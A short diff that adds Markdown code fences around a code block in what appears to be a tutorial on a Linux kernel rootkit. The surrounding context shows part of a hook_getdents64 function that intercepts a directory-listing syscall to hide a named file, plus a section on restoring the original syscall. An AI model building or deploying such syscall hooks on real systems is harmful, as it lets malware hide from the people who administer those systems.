@@ -367,6 +367,7 @@ static inline void protect_memory(void)
 
 The hook function hook_getdents64 intercepts calls to getdents64, checks file names, and hides any file named file_to_hide.
 
+```
 asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
     int ret = orig_getdents64(fd, dirp, count);
     struct linux_dirent64 *d, *kd, *kdirent = NULL;
@@ -398,6 +399,8 @@ asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirp, uns
     kfree(kdirent);
     return ret;
 }
+```
+
 6) Unloading and Restoring
 
 When unloading the module, the original syscall is restored:
